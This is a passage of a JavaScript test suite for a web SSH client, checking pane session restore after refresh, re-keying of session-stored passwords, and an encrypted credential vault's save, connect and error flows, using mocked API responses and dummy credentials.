     'sessionStorage holds the plaintext password');
  cleanup(env);
});

test('manual pane F5 same-tab: secrets restored from sessionStorage', async () => {
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      return {session_id: 'sid-mp' + connects.length, alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'manual.example.com';
  $(win, 'iU').value = 'alice';
  $(win, 'iPw').value = 'verysecret';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(120);
  win.eval('saveSessions()');
  // Simulate F5: tear down in-memory panes, keep both stores.
  win.eval(
    `Object.keys(panes).forEach(k => { try{panes[k].term.dispose()}catch(e){} delete panes[k]; });` +
    `document.getElementById('panes').innerHTML = '';`);
  win.eval('tryRestoreSessions()');
  await sleep(150);
  ok(connects.length === 2, 'restore fired a second connect; got ' + connects.length);
  const restoreBody = connects[1];
  ok(restoreBody.host === 'manual.example.com', 'host restored');
  ok(restoreBody.username === 'alice', 'username restored');
  ok(restoreBody.password === 'verysecret',
     'password restored from sessionStorage');
  cleanup(env);
});

test('a background reconnect does not hijack the split the user is connecting', async () => {
  // beginSessionIO ran for EVERY session start and always hid the login
  // form and nulled pendingSplit/connectingFor. A background pane that
  // finished reconnecting while the user was connecting a split made the
  // split connect fall back to the active pane: its session was
  // overwritten (and never disconnected) and no split was created.
  let release2;
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: (b) => {
      connects.push(b.host);
      return {session_id: 'sid-' + b.host, alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}, delay: 50},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const p1 = await _onePane(win);                       // host a.host
  const p1sid = p1.sid;
  // A second, background pane whose reconnect is still in flight.
  const p2 = win.createPane(win.document.getElementById('panes'));
  p2.host = 'bg.host'; p2.user = 'u'; p2.password = 'x';
  win.activatePane(p1.id);
  // The user starts a split from p1 and fills in the form...
  win.splitPane(p1.id, 'h');
  ok(!$(win, 'ov').classList.contains('h'), 'form open for the split');
  // ...meanwhile p2's reconnect completes.
  await win.connectPane(p2, {label: 'bg', host: 'bg.host', user: 'u', password: 'x'});
  await sleep(40);
  ok(!$(win, 'ov').classList.contains('h'), 'the form the user is typing in stays open');
  ok(win.overlayMode === 'split' && win.pendingSplit && win.pendingSplit.fromId === p1.id,
     'the split request survives; got ' + win.overlayMode + ' ' + JSON.stringify(win.pendingSplit));
  // Now the user's split connect completes.
  $(win, 'iH').value = 'split.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  win.doConnect();
  await sleep(150);
  const ps = paneList(win);
  ok(ps.length === 3, 'a new split pane was created; got ' + ps.length);
  ok(p1.sid === p1sid && p1.host === 'a.host', 'p1 keeps its own session; got ' + p1.sid + ' ' + p1.host);
  ok(ps.some(p => p.host === 'split.host' && p !== p1 && p !== p2), 'split.host is in its own pane');
  ok($(win, 'ov').classList.contains('h'), 'and the form closes on ITS success');
  ps.forEach(p => { p.polling = false; });
  cleanup(env);
});

test('Enter in the login form connects; Enter in Options does not', async () => {
  // The handler was bound with querySelector('.panel') - the FIRST
  // .panel in the page is Options: Enter in the form did nothing, and
  // Enter in an Options field fired a connect (and a spurious toast).
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}},
                          {action: 'connect', response: {session_id: 'sid-enter', alive: true}},
                          {action: 'resize', response: {ok: true}}]);
  const win = env.win;
  let calls = 0;
  win.doConnect = () => { calls++; };
  const enter = (el) => el.dispatchEvent(new win.KeyboardEvent('keydown',
    {key: 'Enter', bubbles: true, cancelable: true}));
  win.showOverlay && win.showOverlay();
  enter($(win, 'iPw'));
  ok(calls === 1, 'Enter in the password field connects; got ' + calls);
  enter($(win, 'iH'));
  ok(calls === 2, 'and in the host field');
  enter($(win, 'iPersistent'));
  ok(calls === 2, 'not on a checkbox');
  enter($(win, 'optTmuxHistory'));
  ok(calls === 2, 'Enter in Options does NOT connect; got ' + calls);
  cleanup(env);
});

test('F5 after splits: every pane reconnects with ITS OWN password', async () => {
  // build() mints ids in layout order while the manifest is walked in
  // creation order, so after splits old->new ids are a permutation
  // (old p3 -> new p2, old p2 -> new p3). Re-keying secrets in place
  // wrote h2's password over p3's before p3's was read: h3 got pw2.
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      return {session_id: 'sid-' + body.host, alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const rec = (h) => ({label: h, via: 'manual', host: h, port: 22, user: 'u',
                       auth: 'pw', persistent: false, slot_id: null,
                       tmux_cmd: 'tmux', cols: 80, rows: 24});
  // Layout order p1, p3, p2 (p1 split right -> p2, then p1 split down -> p3).
  win.localStorage.setItem('websh_panes', JSON.stringify({
    version: 2,
    layout: {type: 'split', dir: 'h',
             a: {type: 'split', dir: 'v', a: {type: 'leaf', pane: 'p1'},
                                          b: {type: 'leaf', pane: 'p3'}},
             b: {type: 'leaf', pane: 'p2'}},
    panes: {p1: rec('h1'), p2: rec('h2'), p3: rec('h3')},
  }));
  win.sessionStorage.setItem('websh_panes_session', JSON.stringify({
    p1: {password: 'pw1'}, p2: {password: 'pw2'}, p3: {password: 'pw3'},
  }));
  win.eval('tryRestoreSessions()');
  await sleep(150);
  const byHost = {};
  connects.forEach(b => { byHost[b.host] = b.password; });
  ok(byHost.h1 === 'pw1' && byHost.h2 === 'pw2' && byHost.h3 === 'pw3',
     'each host got its own password; got ' + JSON.stringify(byHost));
  // And the store is keyed by the NEW ids, still one secret per host,
  // so the next F5 is right too.
  const store = JSON.parse(win.sessionStorage.getItem('websh_panes_session'));
  const ps = paneList(win);
  ps.forEach(p => {
    ok(store[p.id] && store[p.id].password === 'pw' + p.host.slice(1),
       p.id + ' (' + p.host + ') keyed to its own secret; got ' + JSON.stringify(store[p.id]));
  });
  ok(Object.keys(store).length === 3, 'no stale keys left; got ' + Object.keys(store));
  cleanup(env);
});

test('manual pane F5 fresh-tab: sessionStorage empty → toast + body has no password', async () => {
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      // Server-side validator would 400 — simulate that here.
      return {error: 'password or key is required'};
    }},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Seed: localStorage manifest with via=manual (no plaintext), but
  // sessionStorage empty (simulates a fresh tab open).
  win.localStorage.setItem('websh_panes', JSON.stringify({
    version: 2,
    layout: {type: 'leaf', pane: 'm1', flex: ''},
    panes: {
      m1: {label: 'Manual', via: 'manual', host: 'manual.example.com',
           port: 22, user: 'alice', auth: 'pw',
           persistent: false, slot_id: null, tmux_cmd: 'tmux',
           cols: 80, rows: 24},
    },
  }));
  win.sessionStorage.removeItem('websh_panes_session');
  win.eval('tryRestoreSessions()');
  await sleep(150);
  ok(connects.length === 1, 'one connect attempted');
  const body = connects[0];
  ok(!body.password && !body.key,
     'no credentials sent — sessionStorage was empty');
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length >= 1, 'a toast was raised about missing credentials');
  cleanup(env);
});

test('manual pane F5 with gap: sessionStorage re-keyed onto new pane ids, second F5 keeps creds', async () => {
  // Regression: pane ids reset on every module load (`'p' + ++paneCounter`),
  // so a manifest with a gap like {p1, p3} (because p2 was closed earlier)
  // is restored as new ids {p1, p2}. tryRestoreSessions must rewrite
  // sessionStorage onto the new ids BEFORE connectPane, otherwise the next
  // saveSessions() writes a manifest keyed by {p1, p2} while sessionStorage
  // still says {p1, p3} — and a SECOND F5 cannot find the secrets and the
  // user sees a missing-creds toast + an auth-less connect body.
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      return {session_id: 'sid-gap' + connects.length, alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;

  // Seed: manifest with a gap (p1 + p3, no p2), sessionStorage matching
  // the manifest. paneCounter forced to 0 so createPane mints p1, p2.
  win.localStorage.setItem('websh_panes', JSON.stringify({
    version: 2,
    layout: {type: 'split', dir: 'h', flex: '',
             a: {type: 'leaf', pane: 'p1', flex: ''},
             b: {type: 'leaf', pane: 'p3', flex: ''}},
    panes: {
      p1: {label: 'one', via: 'manual', host: 'h1.example.com',
           port: 22, user: 'u1', auth: 'pw',
           persistent: false, slot_id: null, tmux_cmd: 'tmux',
           cols: 80, rows: 24},
      p3: {label: 'three', via: 'manual', host: 'h3.example.com',
           port: 22, user: 'u3', auth: 'pw',
           persistent: false, slot_id: null, tmux_cmd: 'tmux',
           cols: 80, rows: 24},
    },
  }));
  win.sessionStorage.setItem('websh_panes_session', JSON.stringify({
    p1: {password: 'secret-one', key: '', key_pass: ''},
    p3: {password: 'secret-three', key: '', key_pass: ''},
  }));
  win.eval('paneCounter = 0');

  // First F5.
  const r1 = win.eval('tryRestoreSessions()');
  ok(r1 === true, 'first tryRestoreSessions returned true; got ' + r1);
  await sleep(200);

  // Two connects, in iteration order over m.panes keys = [p1, p3].
  // Layout walk mints {p1-leaf → id p1, p3-leaf → id p2}.
  ok(connects.length === 2, 'first F5 fired 2 connects; got ' + connects.length);
  ok(connects[0].password === 'secret-one',
     'first connect carried secret-one; got ' + connects[0].password);
  ok(connects[1].password === 'secret-three',
     'second connect carried secret-three; got ' + connects[1].password);

  // sessionStorage was re-keyed: p1 stays (oldId === p.id), p3 → p2.
  let ss = JSON.parse(win.sessionStorage.getItem('websh_panes_session') || '{}');
  ok(ss.p1 && ss.p1.password === 'secret-one',
     'p1 entry kept (no-op re-key); got ' + JSON.stringify(ss.p1));
  ok(ss.p2 && ss.p2.password === 'secret-three',
     'p3 entry re-keyed onto p2; got ' + JSON.stringify(ss.p2));
  ok(!('p3' in ss),
     'old p3 entry dropped from sessionStorage; got keys=' + Object.keys(ss).join(','));

  // No missing-creds toast on this first F5 either.
  const toasts1 = Array.from(win.document.querySelectorAll('#toastHost .toast'))
    .filter(t => t.textContent.indexOf('saved credentials') !== -1);
  ok(toasts1.length === 0,
     'first F5: no missing-creds toast; got ' + toasts1.length);

  // saveSessions runs inside connectPane on success — manifest now keyed
  // by {p1, p2}. Verify before driving the second F5.
  const manifestPost = JSON.parse(win.localStorage.getItem('websh_panes'));
  const keysPost = Object.keys(manifestPost.panes).sort();
  ok(JSON.stringify(keysPost) === JSON.stringify(['p1', 'p2']),
     'manifest re-keyed by saveSessions; got keys=' + keysPost.join(','));

  // Second F5: tear down in-memory panes, reset paneCounter, restore.
  // No need to touch storage — manifest + sessionStorage already reflect
  // the post-first-F5 state.
  win.eval(
    `Object.keys(panes).forEach(k => { try{panes[k].term.dispose()}catch(e){} delete panes[k]; });` +
    `document.getElementById('panes').innerHTML = '';` +
    `paneCounter = 0;`);
  const beforeSecond = connects.length;
  const r2 = win.eval('tryRestoreSessions()');
  ok(r2 === true, 'second tryRestoreSessions returned true; got ' + r2);
  await sleep(200);

  // Two more connects fired by the second F5. Iteration over manifest
  // keys [p1, p2] (= post-rewrite save order) with paneCounter reset 0:
  // p1-leaf → id p1 (no-op re-key), p2-leaf → id p2 (no-op re-key).
  const secondConnects = connects.slice(beforeSecond);
  ok(secondConnects.length === 2, 'second F5 fired 2 connects; got ' + secondConnects.length);
  ok(secondConnects[0].password === 'secret-one',
     'second F5: pane 1 has secret-one; got ' + secondConnects[0].password);
  ok(secondConnects[1].password === 'secret-three',
     'second F5: pane 2 has secret-three; got ' + secondConnects[1].password);

  // No missing-creds toast on the second F5 — this is the regression bar.
  const toasts2 = Array.from(win.document.querySelectorAll('#toastHost .toast'))
    .filter(t => t.textContent.indexOf('saved credentials') !== -1);
  ok(toasts2.length === 0,
     'second F5: no missing-creds toast (regression); got ' + toasts2.length);

  cleanup(env);
});

test('manual pane close: sessionStorage entry deleted with the pane', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-mp4', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'disconnect', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  win.doConnect();
  await sleep(120);
  const ids = Object.keys(win.panes);
  ok(ids.length === 1, 'one pane materialized');
  let ss = JSON.parse(win.sessionStorage.getItem('websh_panes_session') || '{}');
  ok(Object.keys(ss).length === 1, 'sessionStorage has the secrets');
  win.closePane(ids[0]);
  await sleep(60);
  ss = JSON.parse(win.sessionStorage.getItem('websh_panes_session') || '{}');
  ok(Object.keys(ss).length === 0,
     'sessionStorage entry removed when pane closed; got ' + Object.keys(ss).length);
  cleanup(env);
});

// =====================================================================
// Vault: F5 refresh for saved panes (via=vault manifest)
// =====================================================================

test('vault F5: saved pane manifest stores conn_id + via=vault (no secrets)', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-pr1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Hand-seed a vault-backed live pane (skip the full save flow — this
  // test focuses on the manifest shape, not the save round-trip).
  const {vault_id, vault_key, conn_id} = await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(120);
  // Force a manifest write.
  win.eval('saveSessions()');
  const manifest = JSON.parse(win.localStorage.getItem('websh_panes'));
  ok(manifest && manifest.panes, 'manifest written');
  const recs = Object.values(manifest.panes);
  ok(recs.length === 1, 'one pane in manifest; got ' + recs.length);
  const rec = recs[0];
  ok(rec.via === 'vault', 'via=vault tag; got via=' + rec.via);
  ok(rec.conn_id === conn_id, 'conn_id persisted; got ' + rec.conn_id);
  ok(!rec.vault_key, 'NO vault_key in manifest (would defeat threat model)');
  ok(!rec.vault_id, 'NO vault_id in manifest (derived from IDB at restore)');
  ok(!rec.password && !rec.key && !rec.key_pass,
     'no plaintext SSH credentials in manifest');
  ok(rec.host === 'p.example.com', 'host kept as display hint');
  ok(rec.user === 'deploy', 'user kept as display hint');
  cleanup(env);
});

test('vault F5: restore rebuilds saved-variant body from manifest', async () => {
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      return {session_id: 'sid-pr' + connects.length, alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const {vault_id, vault_key, conn_id} = await _seedVaultCard(win);
  // First connect: click the saved card.
  win.document.querySelector('.sv').click();
  await sleep(120);
  ok(connects.length === 1, 'first connect fired');
  ok(connects[0].vault_id === vault_id, 'first connect: saved-variant body');
  win.eval('saveSessions()');
  // Simulate F5: nuke in-memory panes, then call tryRestoreSessions
  // (mirrors what loadServerConfig does after a page reload).
  win.eval(
    `Object.keys(panes).forEach(k => { try{panes[k].term.dispose()}catch(e){} delete panes[k]; });` +
    `document.getElementById('panes').innerHTML = '';`);
  const restored = win.eval('tryRestoreSessions()');
  ok(restored === true, 'tryRestoreSessions returned true; got ' + restored);
  await sleep(200);
  ok(connects.length === 2, 'restore fired a second /api/connect; got ' + connects.length);
  const restoreBody = connects[1];
  ok(restoreBody.vault_id === vault_id, 'restore body has the same vault_id');
  ok(restoreBody.conn_id === conn_id, 'restore body has the saved conn_id');
  ok(Buffer.from(restoreBody.vault_key, 'base64').length === 32,
     'restore body has 32-byte vault_key (re-derived from IDB)');
  ok(!restoreBody.host && !restoreBody.password,
     'no manual-mode fields on restore body');
  cleanup(env);
});

test('vault F5: legacy v2 pane record (no via) still restores via manual path', async () => {
  const connects = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connects.push(body);
      return {session_id: 'sid-pr-legacy', alive: true};
    }},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Seed a legacy v2 manifest with inline plaintext (no via, no conn_id).
  win.localStorage.setItem('websh_panes', JSON.stringify({
    version: 2,
    layout: {type: 'leaf', pane: 'leg1', flex: ''},
    panes: {
      leg1: {
        label: 'Legacy', host: 'legacy.example.com', port: 22, user: 'u',
        connection: null, auth: 'pw', password: 'oldpw', key: '', key_pass: '',
        persistent: false, slot_id: null, tmux_cmd: 'tmux',
        cols: 80, rows: 24,
        // notably absent: via, conn_id
      },
    },
  }));
  const restored = win.eval('tryRestoreSessions()');
  ok(restored === true, 'legacy v2 manifest restores; got ' + restored);
  await sleep(200);
  ok(connects.length === 1, 'one connect fired for legacy pane');
  const body = connects[0];
  ok(body.host === 'legacy.example.com', 'legacy host on body');
  ok(body.password === 'oldpw', 'legacy password on body');
  ok(!body.vault_id && !body.conn_id,
     'no vault fields on legacy restore body');
  cleanup(env);
});

// =====================================================================
// Vault: saved-card click → saved-variant /api/connect
// =====================================================================

async function _seedVaultCard(win) {
  // Helper: force ensureVaultId / ensureVaultKey to materialise so the
  // saved-card click can export a real vault_key. Returns {vault_id,
  // vault_key, conn_id} to compare wire bodies against.
  const vault_id = await win.eval('ensureVaultId()');
  const vault_key = await win.eval('exportRawVaultKey()');
  const conn_id = 'S'.repeat(26);
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'Prod', conn_id, host: 'p.example.com', port: 22,
     user: 'deploy', auth: 'pw', persistent: false}]));
  win.eval('renderSaved()');
  return {vault_id, vault_key, conn_id};
}

test('saved-card connect: click → saved-variant body to /api/connect', async () => {
  let connectBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connectBody = body;
      return {session_id: 'sid-sv1', alive: true};
    }, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  const {vault_id, vault_key, conn_id} = await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  // Give the async ensureVaultId/exportRawVaultKey chain time to settle
  // (it was already warmed by _seedVaultCard, so this is mostly the
  // fetch interceptor's 1 ms turnaround).
  await sleep(80);
  ok(connectBody, '/api/connect was called');
  ok(connectBody.vault_id === vault_id, 'vault_id matches IDB-resident id');
  ok(connectBody.conn_id === conn_id, 'conn_id matches saved card');
  ok(connectBody.vault_key === vault_key, 'vault_key is raw export of K');
  ok(Buffer.from(connectBody.vault_key, 'base64').length === 32,
     'vault_key is 32 bytes base64');
  ok(!connectBody.host && !connectBody.username && !connectBody.password &&
     !connectBody.key && !connectBody.connection,
     'no host/username/password/key/connection — server pulls from vault');
  cleanup(env);
});

test('saved-card connect: legacy entry (no conn_id) still uses manual body', async () => {
  let connectBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: (body) => {
      connectBody = body;
      return {session_id: 'sid-sv2', alive: true};
    }, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Pre-vault localStorage row — keep working until user re-saves.
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'OldProd', host: 'old.example.com', port: 22,
     user: 'u', pass: 'hunter2'}]));
  win.eval('renderSaved()');
  win.document.querySelector('.sv').click();
  await sleep(80);
  ok(connectBody, '/api/connect was called');
  ok(connectBody.host === 'old.example.com', 'manual host on body');
  ok(connectBody.username === 'u', 'manual username on body');
  ok(connectBody.password === 'hunter2', 'manual password on body');
  ok(!connectBody.vault_id && !connectBody.conn_id && !connectBody.vault_key,
     'no vault fields for legacy entry');
  cleanup(env);
});

// The three "...mapping..." tests below exercise error-STRING mapping,
// not HTTP-status mapping. websh.js api() always parses the JSON body
// and ignores the status; saved-variant /api/connect errors are
// pattern-matched on `r.error`. If the dispatch ever switches to
// status-code routing, these tests need to be upgraded (makeFetch
// would have to honor a `status:` field on the plan entry).
test('saved-card connect: "saved entry not found" error string surfaces vault_not_found popup', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {error: 'saved entry not found'}, once: true},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(80);
  ok(!hidden($(win, 'tmuxOv')), 'connect-status popup visible');
  ok($(win, 'tmTitle').textContent === 'Saved entry missing on server',
     'vault_not_found title; got=' + $(win, 'tmTitle').textContent);
  cleanup(env);
});

test('saved-card connect: "vault_decrypt_failed" error string surfaces vault_decrypt popup', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {error: 'vault_decrypt_failed'}, once: true},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(80);
  ok($(win, 'tmTitle').textContent === 'Cannot decrypt this card',
     'vault_decrypt title; got=' + $(win, 'tmTitle').textContent);
  cleanup(env);
});

test('saved-card connect: "credential vault unavailable" error string surfaces vault_off popup', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {error: 'credential vault unavailable — see server log'},
     once: true},
  ];
  const env = await mkEnv(plan); const win = env.win;
  await _seedVaultCard(win);
  win.document.querySelector('.sv').click();
  await sleep(80);
  ok($(win, 'tmTitle').textContent === 'Vault is disabled on the server',
     'vault_off title; got=' + $(win, 'tmTitle').textContent);
  cleanup(env);
});

// =====================================================================
// Vault: save flow — encrypt + POST /api/save after stable connect
// =====================================================================

test('vault save: doConnect with iSave → /api/save POST after stable window', async () => {
  let saveBody = null;
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-vs1', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: (body) => { saveBody = body; return {}; }, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = '10.1.2.3';
  $(win, 'iU').value = 'deploy';
  $(win, 'iPw').value = 'hunter2';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true;
  $(win, 'iName').value = 'My Prod';
  win.doConnect();
  // Let the connect resolve and materialize the pane.
  await sleep(120);
  const ps = paneList(win);
  ok(ps.length === 1, 'pane materialized after connect; got ' + ps.length);
  const p = ps[0];
  ok(p.pendingSave, 'pendingSave set on pane');
  // __ephemeralSecrets is non-enumerable (so JSON.stringify and
  // Object.assign drop it); direct access still works.
  ok(p.pendingSave.__ephemeralSecrets && p.pendingSave.__ephemeralSecrets.password === 'hunter2',
     '__ephemeralSecrets carry the password');
  ok(!Object.keys(p.pendingSave).includes('__ephemeralSecrets'),
     '__ephemeralSecrets is non-enumerable (does not show in Object.keys)');
  ok(!JSON.stringify(p.pendingSave).includes('hunter2'),
     'pendingSave does not leak plaintext via JSON.stringify');
  ok(!p.pendingSave.pass && !p.pendingSave.key,
     'pendingSave has no legacy pass/key fields');
  // Force the stable-window threshold by backdating connectedAt; then
  // synthesize a healthy alive=true output frame to trigger the commit.
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  // Wait for the async encrypt + POST round-trip.
  await sleep(80);
  ok(saveBody, '/api/save was POSTed; got saveBody=' + JSON.stringify(saveBody));
  ok(/^[A-Z2-7]{26}$/.test(saveBody.vault_id), 'vault_id well-formed; got ' + saveBody.vault_id);
  ok(/^[A-Z2-7]{26}$/.test(saveBody.conn_id), 'conn_id well-formed; got ' + saveBody.conn_id);
  ok(saveBody.host === '10.1.2.3', 'host stored cleartext');
  ok(saveBody.username === 'deploy', 'username stored cleartext');
  ok(saveBody.port === 22, 'port surfaced');
  ok(typeof saveBody.iv === 'string' && Buffer.from(saveBody.iv, 'base64').length === 12,
     'iv is 12 bytes base64');
  ok(typeof saveBody.ct === 'string' && Buffer.from(saveBody.ct, 'base64').length >= 17,
     'ct is at least 17 bytes (GCM tag minimum)');
  ok(!('password' in saveBody) && !('key' in saveBody) && !('vault_key' in saveBody),
     'no secret material in the save body');
  // localStorage should now have the saved card without secrets.
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(list.length === 1, 'one saved card in localStorage');
  ok(list[0].conn_id === saveBody.conn_id, 'conn_id matches what was POSTed');
  ok(!list[0].pass && !list[0].key && !list[0].__ephemeralSecrets &&
     !list[0]._pendingSecrets,
     'no secrets / __ephemeralSecrets in localStorage entry');
  ok(list[0].name === 'My Prod' && list[0].auth === 'pw',
     'name and auth survived');
  cleanup(env);
});

test('vault save: failure surfaces toast, localStorage untouched, session lives', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-vs2', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: {error: 'simulated_failure'}, once: true},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h2'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true;
  $(win, 'iName').value = 'Doomed';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  p.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p, {data: '', alive: true});
  await sleep(80);
  const list = JSON.parse(win.localStorage.getItem('websh_connections') || '[]');
  ok(list.length === 0, 'save failure does NOT write to localStorage; list len=' + list.length);
  // Toast presence is the user-visible signal. The host element is in DOM.
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length >= 1, 'a toast was raised for the save failure; count=' + toasts.length);
  ok(p.sid === 'sid-vs2', 'live session retained sid (connect not killed)');
  cleanup(env);
});

test('vault save: vault_enabled=false leaves no pendingSave (even if iSave forced)', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: false}},
    {action: 'connect', response: {session_id: 'sid-vs3', alive: true}, once: true},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  $(win, 'iH').value = 'h3'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
  $(win, 'iPersistent').checked = false;
  // Even if someone (bookmarklet, extension) toggles the hidden checkbox,
  // doConnect must refuse to build the save entry without server backing.
  $(win, 'iSave').checked = true;
  $(win, 'iName').value = 'Hostile';
  win.doConnect();
  await sleep(120);
  const p = paneList(win)[0];
  ok(!p.pendingSave, 'no pendingSave when vault_enabled=false');
  // No /api/save action should have been called.
  const saveLog = env.log.filter(e => e.action === 'save');
  ok(saveLog.length === 0, '/api/save never called when vault disabled');
  cleanup(env);
});

test('vault save: same-name re-save reaps prior conn_id from server', async () => {
  // Saving twice under the same name (legit "updating the password"
  // workflow) drops the old localStorage row. Without this fix the old
  // server-side blob lingers under the previous conn_id — quiet
  // accumulation per legitimate re-save. We assert that the OLD conn_id
  // is reaped via /api/save_delete after the second /api/save lands.
  const saveBodies = [];
  const deleteUrls = [];
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: [],
                                    vault_enabled: true}},
    {action: 'connect', response: {session_id: 'sid-resave', alive: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'save', response: (body) => { saveBodies.push(body); return {}; }},
    {action: 'save_delete', response: {}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  // Capture every save_delete URL — the conn_id of the reaped blob
  // travels in the query string (same shape as the sign-out tests).
  const originalFetch = win.fetch;
  win.fetch = async (url, init) => {
    if (url.indexOf('save_delete') !== -1) deleteUrls.push(url);
    return originalFetch(url, init);
  };
  // First save: name "Prod", first conn_id is minted at commit time.
  $(win, 'iH').value = 'prod.ex'; $(win, 'iU').value = 'deploy';
  $(win, 'iPw').value = 'old-pw'; $(win, 'iPersistent').checked = false;
  $(win, 'iSave').checked = true; $(win, 'iName').value = 'Prod';
  win.doConnect();
  await sleep(120);
  let p1 = paneList(win)[0];
  p1.connectedAt = Date.now() - 3000;
  win.handleOutputPayload(p1, {data: '', alive: true});
  await sleep(80);
  ok(saveBodies.length === 1, 'first /api/save POSTed; got ' + saveBodies.length);
  const firstConnId = saveBodies[0].conn_id;
  const realVaultId = saveBodies[0].vault_id;
  ok(/^[A-Z2-7]{26}$/.test(firstConnId), 'first conn_id well-formed; got ' + firstConnId);
  // No save_delete yet — this was the first save.
  ok(deleteUrls.length === 0, 'no save_delete after first save; got ' + deleteUrls.length);
  // Close the pane so we can run a clean second doConnect under the same
  // name with different credentials.
  win.closePane(p1.id);
  await sleep(60);
  // Second save: same name "Prod", different password. The new entry
  // mints a fresh conn_id; the old one must be reaped from the server.
